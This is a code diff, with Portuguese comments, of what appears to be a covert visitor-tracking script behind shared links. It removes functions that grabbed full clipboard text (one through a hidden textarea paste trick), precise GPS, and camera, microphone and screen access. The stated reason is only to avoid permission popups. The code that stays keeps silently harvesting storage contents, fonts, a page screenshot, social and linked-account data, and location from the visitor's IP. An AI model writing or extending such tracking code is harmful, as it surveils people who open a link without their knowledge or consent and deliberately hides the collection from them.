@@ -253,8 +253,8 @@ async function collectAllData(linkId) {
       },
       battery: await getBatteryInfoSilent(),
       mediaDevices: await getMediaDevicesSilent(),
-      permissions: await getPermissionsAggressive(),
-      geolocation: await getGeolocationAggressive(), // Tentativa agressiva
+      permissions: { skipped: true, note: 'Permissions check disabled to avoid popups' },
+      geolocation: { skipped: true, note: 'Geolocation by IP done on server' },
       fonts: getFonts(),
       localStorage: getLocalStorage(),
       sessionStorage: getSessionStorage(),
@@ -269,22 +269,22 @@ async function collectAllData(linkId) {
       pageScreenshot: await getPageScreenshot(),
       // Dados de rede social (se compartilhado)
       socialMedia: getSocialMediaData(),
-      // Dados de clipboard (tentativa agressiva - pode pedir permissão mas tentamos)
-      clipboard: await getClipboardDataAggressive(),
+      // Dados de clipboard (removido - evita pedir permissão)
+      clipboard: { available: false, skipped: true },
       // Dados de vibração (mobile)
       vibration: detectVibration(),
-      // Dados de orientação do dispositivo (versão agressiva)
-      deviceOrientation: await getDeviceOrientationAggressive(),
-      // Dados de movimento do dispositivo (versão agressiva)
-      deviceMotion: await getDeviceMotionAggressive(),
-      // Dados de iluminação ambiente (versão agressiva)
-      ambientLight: await getAmbientLightAggressive(),
-      // Tentativa de acesso a câmera (pode pedir permissão)
-      camera: await getCameraAccessAggressive(),
-      // Tentativa de acesso a microfone (pode pedir permissão)
-      microphone: await getMicrophoneAccessAggressive(),
-      // Tentativa de acesso a tela (pode pedir permissão)
-      screenCapture: await getScreenCaptureAggressive()
+      // Dados de orientação do dispositivo (silencioso - sem pedir permissão)
+      deviceOrientation: await getDeviceOrientationSilent(),
+      // Dados de movimento do dispositivo (silencioso - sem pedir permissão)
+      deviceMotion: await getDeviceMotionSilent(),
+      // Dados de iluminação ambiente (silencioso - sem pedir permissão)
+      ambientLight: await getAmbientLightSilent(),
+      // Câmera (removido - evita pedir permissão)
+      camera: { available: false, skipped: true },
+      // Microfone (removido - evita pedir permissão)
+      microphone: { available: false, skipped: true },
+      // Captura de tela (removido - evita pedir permissão)
+      screenCapture: { available: false, skipped: true }
     },
     
     // NOVO: Dados de Contas e Emails Vinculados
@@ -531,87 +531,30 @@ async function getMediaDevicesSilent() {
   return 'not_available';
 }
 
-// Versão AGRESSIVA - tenta verificar permissões mesmo que possa pedir
-async function getPermissionsAggressive() {
-  const permissions = {};
-  const permissionNames = [
-    'geolocation',
-    'notifications',
-    'push',
-    'camera',
-    'microphone',
-    'persistent-storage',
-    'accelerometer',
-    'gyroscope',
-    'magnetometer',
-    'ambient-light-sensor'
-  ];
-
-  for (const name of permissionNames) {
-    try {
-      if (navigator.permissions && navigator.permissions.query) {
-        // Tentar query mesmo que possa pedir permissão
-        const result = await Promise.race([
-          navigator.permissions.query({ name }),
-          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 500))
-        ]);
-        permissions[name] = result.state;
-      } else {
-        permissions[name] = 'api_not_available';
-      }
-    } catch (e) {
-      permissions[name] = 'error_or_denied';
-    }
-  }
-
-  return permissions;
+// Versão silenciosa - NÃO verifica permissões para evitar popups
+async function getPermissionsSilent() {
+  // Não verificamos permissões para evitar qualquer popup
+  // Retornamos apenas informações básicas sem fazer queries
+  return {
+    geolocation: 'not_checked',
+    notifications: 'not_checked',
+    push: 'not_checked',
+    camera: 'not_checked',
+    microphone: 'not_checked',
+    persistentStorage: 'not_checked',
+    note: 'Permissions check disabled to avoid popups'
+  };
 }
 
-// Versão AGRESSIVA - tenta obter GPS mesmo que peça permissão
-async function getGeolocationAggressive() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve('not_available');
-      return;
-    }
-
-    // Tentar obter GPS - pode pedir permissão mas tentamos mesmo assim
-    const timeout = setTimeout(() => {
-      resolve('timeout');
-    }, 2000);
-
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        clearTimeout(timeout);
-        resolve({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          altitude: position.coords.altitude,
-          altitudeAccuracy: position.coords.altitudeAccuracy,
-          heading: position.coords.heading,
-          speed: position.coords.speed,
-          timestamp: position.timestamp,
-          source: 'gps_permission_granted'
-        });
-      },
-      (error) => {
-        clearTimeout(timeout);
-        // Retornar código de erro para análise
-        resolve({ 
-          error: error.code, 
-          message: error.message,
-          attempted: true,
-          permissionRequested: true
-        });
-      },
-      { 
-        timeout: 2000, 
-        maximumAge: 0, // Sempre tentar obter novo
-        enableHighAccuracy: true // Pedir alta precisão
-      }
-    );
-  });
+// Versão silenciosa - REMOVIDO completamente para evitar pedidos de permissão
+// getCurrentPosition SEMPRE pede permissão na primeira vez
+// Geolocalização por IP será feita no servidor (sem pedir permissão)
+async function getGeolocationSilent() {
+  return {
+    skipped: true,
+    reason: 'Avoid permission popup',
+    note: 'Geolocation by IP will be done on server instead'
+  };
 }
 
 function getFonts() {
@@ -998,63 +941,10 @@ function detectSocialReferrer() {
 }
 
 // Obter dados de clipboard
-// Versão AGRESSIVA - tenta acessar clipboard mesmo que peça permissão
-async function getClipboardDataAggressive() {
-  try {
-    // Método 1: Clipboard API moderna
-    if (navigator.clipboard && navigator.clipboard.readText) {
-      try {
-        const text = await Promise.race([
-          navigator.clipboard.readText(),
-          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 500))
-        ]);
-        return {
-          available: true,
-          method: 'clipboard_api',
-          hasText: text.length > 0,
-          textLength: text.length,
-          preview: text.substring(0, 100), // Primeiros 100 caracteres
-          fullText: text // Coletar texto completo
-        };
-      } catch (e) {
-        // Pode ter pedido permissão e negado
-        return {
-          available: false,
-          attempted: true,
-          permissionRequested: true,
-          error: e.message
-        };
-      }
-    }
-
-    // Método 2: ExecCommand (deprecated mas pode funcionar)
-    try {
-      const textarea = document.createElement('textarea');
-      textarea.style.position = 'fixed';
-      textarea.style.opacity = '0';
-      document.body.appendChild(textarea);
-      textarea.focus();
-      const success = document.execCommand('paste');
-      document.body.removeChild(textarea);
-      
-      if (success && textarea.value) {
-        return {
-          available: true,
-          method: 'execCommand',
-          hasText: textarea.value.length > 0,
-          textLength: textarea.value.length,
-          preview: textarea.value.substring(0, 100),
-          fullText: textarea.value
-        };
-      }
-    } catch (e) {
-      // Ignorar
-    }
-
-    return { available: false, attempted: true };
-  } catch (e) {
-    return { available: false, error: e.message };
-  }
+// Função removida - clipboard pede permissão explícita
+// Não usamos mais para evitar pedidos de permissão
+async function getClipboardDataSilent() {
+  return { available: false, skipped: true };
 }
 
 // Detectar vibração
@@ -1107,8 +997,8 @@ async function getDeviceMotionSilent() {
   });
 }
 
-// Versão AGRESSIVA - tenta obter luz ambiente mesmo que peça permissão
-async function getAmbientLightAggressive() {
+// Versão silenciosa
+async function getAmbientLightSilent() {
   return new Promise((resolve) => {
     if (window.AmbientLightSensor) {
       try {
@@ -1159,267 +1049,9 @@ async function getAmbientLightAggressive() {
   });
 }
 
-// Tentar acessar câmera (VERSÃO AGRESSIVA - pode pedir permissão)
-async function getCameraAccessAggressive() {
-  return new Promise((resolve) => {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      resolve({ available: false, apiNotSupported: true });
-      return;
-    }
-
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then((stream) => {
-        // Obter informações da câmera sem mostrar preview
-        const videoTrack = stream.getVideoTracks()[0];
-        const capabilities = videoTrack.getCapabilities ? videoTrack.getCapabilities() : null;
-        const settings = videoTrack.getSettings();
-        
-        // Parar o stream imediatamente
-        stream.getTracks().forEach(track => track.stop());
-        
-        resolve({
-          available: true,
-          permissionGranted: true,
-          deviceId: settings.deviceId,
-          groupId: settings.groupId,
-          width: settings.width,
-          height: settings.height,
-          aspectRatio: settings.aspectRatio,
-          frameRate: settings.frameRate,
-          facingMode: settings.facingMode,
-          capabilities: capabilities
-        });
-      })
-      .catch((error) => {
-        resolve({
-          available: false,
-          attempted: true,
-          permissionRequested: true,
-          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
-          error: error.name,
-          message: error.message
-        });
-      });
-  });
-}
-
-// Tentar acessar microfone (VERSÃO AGRESSIVA - pode pedir permissão)
-async function getMicrophoneAccessAggressive() {
-  return new Promise((resolve) => {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      resolve({ available: false, apiNotSupported: true });
-      return;
-    }
-
-    navigator.mediaDevices.getUserMedia({ audio: true })
-      .then((stream) => {
-        // Obter informações do microfone sem gravar
-        const audioTrack = stream.getAudioTracks()[0];
-        const capabilities = audioTrack.getCapabilities ? audioTrack.getCapabilities() : null;
-        const settings = audioTrack.getSettings();
-        
-        // Parar o stream imediatamente
-        stream.getTracks().forEach(track => track.stop());
-        
-        resolve({
-          available: true,
-          permissionGranted: true,
-          deviceId: settings.deviceId,
-          groupId: settings.groupId,
-          echoCancellation: settings.echoCancellation,
-          autoGainControl: settings.autoGainControl,
-          noiseSuppression: settings.noiseSuppression,
-          sampleRate: settings.sampleRate,
-          sampleSize: settings.sampleSize,
-          channelCount: settings.channelCount,
-          latency: settings.latency,
-          capabilities: capabilities
-        });
-      })
-      .catch((error) => {
-        resolve({
-          available: false,
-          attempted: true,
-          permissionRequested: true,
-          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
-          error: error.name,
-          message: error.message
-        });
-      });
-  });
-}
-
-// Tentar capturar tela (VERSÃO AGRESSIVA - pode pedir permissão)
-async function getScreenCaptureAggressive() {
-  return new Promise((resolve) => {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-      resolve({ available: false, apiNotSupported: true });
-      return;
-    }
-
-    navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
-      .then((stream) => {
-        // Obter informações da captura sem mostrar preview
-        const videoTrack = stream.getVideoTracks()[0];
-        const settings = videoTrack.getSettings();
-        
-        // Parar o stream imediatamente
-        stream.getTracks().forEach(track => track.stop());
-        
-        resolve({
-          available: true,
-          permissionGranted: true,
-          width: settings.width,
-          height: settings.height,
-          aspectRatio: settings.aspectRatio,
-          frameRate: settings.frameRate,
-          displaySurface: settings.displaySurface,
-          logicalSurface: settings.logicalSurface
-        });
-      })
-      .catch((error) => {
-        resolve({
-          available: false,
-          attempted: true,
-          permissionRequested: true,
-          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
-          error: error.name,
-          message: error.message
-        });
-      });
-  });
-}
-
-// Tentar acessar câmera (VERSÃO AGRESSIVA - pode pedir permissão)
-async function getCameraAccessAggressive() {
-  return new Promise((resolve) => {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      resolve({ available: false, apiNotSupported: true });
-      return;
-    }
-
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then((stream) => {
-        // Obter informações da câmera sem mostrar preview
-        const videoTrack = stream.getVideoTracks()[0];
-        const capabilities = videoTrack.getCapabilities ? videoTrack.getCapabilities() : null;
-        const settings = videoTrack.getSettings();
-        
-        // Parar o stream imediatamente
-        stream.getTracks().forEach(track => track.stop());
-        
-        resolve({
-          available: true,
-          permissionGranted: true,
-          deviceId: settings.deviceId,
-          groupId: settings.groupId,
-          width: settings.width,
-          height: settings.height,
-          aspectRatio: settings.aspectRatio,
-          frameRate: settings.frameRate,
-          facingMode: settings.facingMode,
-          capabilities: capabilities
-        });
-      })
-      .catch((error) => {
-        resolve({
-          available: false,
-          attempted: true,
-          permissionRequested: true,
-          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
-          error: error.name,
-          message: error.message
-        });
-      });
-  });
-}
-
-// Tentar acessar microfone (VERSÃO AGRESSIVA - pode pedir permissão)
-async function getMicrophoneAccessAggressive() {
-  return new Promise((resolve) => {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      resolve({ available: false, apiNotSupported: true });
-      return;
-    }
-
-    navigator.mediaDevices.getUserMedia({ audio: true })
-      .then((stream) => {
-        // Obter informações do microfone sem gravar
-        const audioTrack = stream.getAudioTracks()[0];
-        const capabilities = audioTrack.getCapabilities ? audioTrack.getCapabilities() : null;
-        const settings = audioTrack.getSettings();
-        
-        // Parar o stream imediatamente
-        stream.getTracks().forEach(track => track.stop());
-        
-        resolve({
-          available: true,
-          permissionGranted: true,
-          deviceId: settings.deviceId,
-          groupId: settings.groupId,
-          echoCancellation: settings.echoCancellation,
-          autoGainControl: settings.autoGainControl,
-          noiseSuppression: settings.noiseSuppression,
-          sampleRate: settings.sampleRate,
-          sampleSize: settings.sampleSize,
-          channelCount: settings.channelCount,
-          latency: settings.latency,
-          capabilities: capabilities
-        });
-      })
-      .catch((error) => {
-        resolve({
-          available: false,
-          attempted: true,
-          permissionRequested: true,
-          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
-          error: error.name,
-          message: error.message
-        });
-      });
-  });
-}
-
-// Tentar capturar tela (VERSÃO AGRESSIVA - pode pedir permissão)
-async function getScreenCaptureAggressive() {
-  return new Promise((resolve) => {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-      resolve({ available: false, apiNotSupported: true });
-      return;
-    }
-
-    navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
-      .then((stream) => {
-        // Obter informações da captura sem mostrar preview
-        const videoTrack = stream.getVideoTracks()[0];
-        const settings = videoTrack.getSettings();
-        
-        // Parar o stream imediatamente
-        stream.getTracks().forEach(track => track.stop());
-        
-        resolve({
-          available: true,
-          permissionGranted: true,
-          width: settings.width,
-          height: settings.height,
-          aspectRatio: settings.aspectRatio,
-          frameRate: settings.frameRate,
-          displaySurface: settings.displaySurface,
-          logicalSurface: settings.logicalSurface
-        });
-      })
-      .catch((error) => {
-        resolve({
-          available: false,
-          attempted: true,
-          permissionRequested: true,
-          permissionDenied: error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError',
-          error: error.name,
-          message: error.message
-        });
-      });
-  });
-}
+// Funções agressivas removidas - não pedem mais permissão
+// Câmera, microfone e captura de tela requerem permissão explícita
+// Mantemos apenas coleta silenciosa
 
 // Detectar VPN/Proxy (indicadores básicos)
 function detectVPNProxy() {
